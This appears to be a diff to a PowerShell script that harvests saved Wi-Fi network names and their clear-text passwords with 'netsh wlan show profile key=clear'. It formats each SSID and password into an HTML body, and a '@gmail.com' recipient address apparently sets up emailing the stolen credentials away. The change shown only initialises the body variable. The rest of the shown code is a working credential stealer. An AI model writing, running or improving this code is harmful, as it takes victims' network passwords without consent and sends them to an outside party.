@@ -7,7 +7,7 @@ $To = $T + "@gmail.com"
 
 $p = @()
 $p += (netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Key Content\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ SSID=$name;PASS=$pass }} 
-
+$Body = ""
 foreach ($pm in $p)
 {
 $Body += "<h3>SSID: 3333<br>PASSWORD: ::</h3>" -replace "::",$pm.PASS  -replace "3333",$pm.SSID
